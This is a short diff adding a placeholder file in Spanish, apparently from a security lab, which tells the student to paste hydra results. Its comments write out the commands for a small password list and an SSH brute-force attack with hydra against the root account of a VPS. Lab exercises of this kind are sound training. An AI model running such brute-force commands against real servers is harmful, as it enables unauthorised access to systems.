@@ -1,0 +1,8 @@
+# PEGAR AQUÍ el resultado de hydra
+# Comando en máquina atacante:
+#   echo -e "admin\nroot\n123456\npassword\ntest" > /tmp/passwords.txt
+#   hydra -l root -P /tmp/passwords.txt -t 4 -s 22 -o /tmp/hydra_result.txt ssh://<IP_VPS>
+#   cat /tmp/hydra_result.txt
+#
+# Borrar este comentario y pegar la salida a continuación:
+
